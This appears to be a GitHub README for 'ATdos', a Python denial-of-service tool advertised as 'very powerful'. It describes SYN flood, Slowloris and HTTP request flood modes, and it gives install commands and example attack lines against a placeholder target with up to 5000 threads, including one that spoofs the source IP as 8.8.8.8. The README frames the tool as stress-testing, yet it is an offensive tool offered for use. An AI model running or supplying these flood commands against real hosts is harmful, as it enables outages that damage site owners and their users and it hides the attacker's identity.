[![](https://img.shields.io/badge/NACG_CJanGe-ATdos-blue)](http://github.com/NACG-Mohr/CJan-Ge)
<h1 align="center">ATdos</h1>

This a very powerful denial of service (DDoS) program. It is very efficient and portable, it is stable and useful for stress-testing companies, it currently has three attack methods. 1) SYN/ICMP with 6 flags including fin, syn, rst, ack, psh and urg. 2) Slowloris/SLOW uses sock.connect to attack. 3) Request/Requester uses httplib to attack. You either choose one of the three attack methods or you can choose all three!   
## Getting Started

You will need a few different modules installed to execute Overload.

### Modules

You will have to use pip to install the modules, colorama, termcolor & requests
```
sudo apt-get install python-pip
```
```
sudo yum install python-pip
```
### Module Installing

Using pip you can install the following modules

```
sudo pip install colorama termcolor requests
```


## Install ATdos

```
git clone https://github.com/nacgalevin/ATdos
```
```
cd ATdos
```
```
chmod +x *
```
```
./install.py
```
## Usages
```
usage: ./ATdos.py -target [target] -port [port] -threads [number threads]

optional arguments:
  -h, --help           show this help message and exit

options:

  -target <ip/domain>  Specify your target
  -timeout <timeout>   Timeout for socket
  -threads <threads>   Set threads number for connection (default = 1000)
  -port <port>         Specify port target (default = 80)
  -sleep <sleep time>  Set sleep time for reconnection
  -spoof <spoofed ip>  Specify spoofed IP address
  -request             Enable request target
  -syn                 Enable syn attack
  -slow                Enable slow attack
  -fakeip              Option to create fake ip if not specifed for spoofed ip
```
## Examples
Slowloris/SLOW attack method
```
./ATdos.py -target www.target.com -port 80 -threads 2000 -slow
```
Request/Requester attack method
```
./ATdos.py -target www.target.com -port 80 -threads 2000 -request
```
SYN/6 flagged ICMP attack method
```
./ATdos.py -target www.target.com -syn -threads 5000
```
SLOW/Request/SYN attack method
```
./ATdos.py -target www.target.com -port 80 -threads 2000 -request -slow -syn
```
SLOW/Request/SYN spoofed IP attack method
```
./ATdos.py -target www.target.com -port 80 -threads 2000 -request -slow -syn -spoof 8.8.8.8
```